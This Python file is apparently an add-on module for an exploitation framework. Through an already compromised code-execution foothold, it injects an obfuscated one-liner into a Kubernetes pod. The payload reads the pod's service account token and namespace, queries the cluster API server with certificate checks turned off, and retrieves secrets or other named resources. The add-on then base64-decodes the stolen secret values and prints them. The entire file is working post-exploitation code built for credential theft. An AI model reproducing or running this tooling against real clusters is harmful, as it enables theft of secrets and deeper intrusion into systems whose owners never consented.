import json
import base64

def run(exploit, params=None):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    if not params:
        print(f" {R}!!{N} Usage: --addon k8s_get <name> OR <resource> <name>")
        return

    target_res, target_name = (params[0], params[1]) if len(params) > 1 else ("secrets", params[0])
    if target_res.lower().startswith("secret"): target_res = "secrets"

    print(f"\n{B}[ K8S EXPLORER: GET {C}{target_res.upper()}/{target_name}{B} ]{N}")

    payload = (
        f"(lambda ns, token: (lambda conn: (conn.request('GET', f'/api/v1/namespaces/{{ns}}/{target_res}/{target_name}', "
        f"headers={{'Authorization': 'Bearer ' + token}}), "
        f"conn.getresponse().read().decode())[1])"
        f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
        f"(open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip(), "
        f"open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip())"
    )

    result = exploit.execute(payload)
    try:
        data = json.loads(result)
        if data.get('kind') == 'Secret' and 'data' in data:
            print(f"{C}DECODED CONTENT:{N}")
            decoded = {k: base64.b64decode(v).decode('utf-8', errors='replace') for k, v in data['data'].items()}
            print(json.dumps(decoded, indent=4))
        else:
            print(f"{C}DATA:{N}\n{json.dumps(data, indent=4)}")
    except Exception:
        print(f" {R}!!{N} Get failed. API Response: {result[:200]}")
    print(f"\n{B}[ Operation Complete ]{N}\n")